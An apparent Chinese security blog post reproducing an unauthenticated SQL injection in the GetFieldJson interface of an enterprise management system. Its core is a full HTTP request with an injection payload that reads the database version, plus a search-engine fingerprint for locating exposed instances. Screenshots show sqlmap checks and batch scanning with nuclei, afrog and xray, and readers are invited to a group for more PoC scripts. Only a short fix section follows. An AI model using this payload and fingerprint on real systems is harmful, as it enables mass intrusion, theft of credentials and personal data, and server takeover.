#  【漏洞复现】某蓝企业管理系统 GetFieldJson SQL注入漏洞   
Superhero  Nday Poc   2024-08-19 10:04  
  
**0x00 免责声明**  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
**0x01 产品简介**  
  
  
某蓝企业管理系统是一款为企业提供全面管理解决方案的软件系统，它能够帮助企业实现精细化管理，提高效率，降低成本。系统集成了多种管理功能，包括但不限于项目管理、财务管理、采购管理、销售管理以及报表分析等，旨在为企业提供一站式的管理解决方案。该系统以先进的管理思想为引导，结合企业实际业务流程，通过信息化手段提升企业管理水平。  
  
**0x02 漏洞概述**  
  
某蓝企业管理系统 GetFieldJson 接口处SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
  
**0x03 搜索引擎**  
```
body="/Home6/AdminPretty"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKMrmqagyRVcADJF4kexiagLZhNOCBLXwHj4UQlvjFyibwFicd83Y0sUqCb9rWMQdVzgX2ZHhdD0lDzw/640?wx_fmt=png&from=appmsg "")  
  
  
**0x04 漏洞复现**  
```
GET /BaseModule/ExcelImport/GetFieldJson?tableCode=%27%20AND%206935%20IN%20(SELECT%20(CHAR(113)%2BCHAR(122)%2BCHAR(112)%2BCHAR(106)%2BCHAR(113)%2B(SELECT%20(CASE%20WHEN%20(6935%3D6935)%20THEN%20@@VERSION%20ELSE%20CHAR(48)%20END))%2BCHAR(113)%2BCHAR(122)%2BCHAR(113)%2BCHAR(118)%2BCHAR(113)))%20AND%20%27qaq%27=%27qaq HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```  
  
查询数据库版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKMrmqagyRVcADJF4kexiagLoJty5Ssq9IP29XrCMAnfOWRhOkrhAeLaGiafKicz6zhxoEXmSI2fTSeQ/640?wx_fmt=png&from=appmsg "")  
  
sqlmap验证****  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKMrmqagyRVcADJF4kexiagLq4zybTB9RzgpkibQQo430qgutKdENcmKUTaIX81iaqG1cdwHEic2Nu05A/640?wx_fmt=png&from=appmsg "")  
  
**0x05 工具批量**  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKMrmqagyRVcADJF4kexiagLPL0a7ZHRKWqQ7cYU2GQBPpiclUiblKQia8IcQB6QOhzdxh48uTRfNyYGg/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKMrmqagyRVcADJF4kexiagLWkt3umfeVvDBoibk9MOQ5YiaVdsd24FXoIUdGD1QghaGW6p2iaic7bKKNg/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKMrmqagyRVcADJF4kexiagLMNZosNcS8DpVeW8jXNu3baEZ81icp0kMsuAyOia1Q8VvB4de95z9tSVA/640?wx_fmt=png&from=appmsg "")  
  
POC脚本获取  
  
请使用VX扫一扫加入内部  
POC脚本分享圈子  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
**0x06 修复建议**  
  
1、关闭互联网暴露  
面或接口设置访问权限  
  
2、升级至安全版本  
  
  
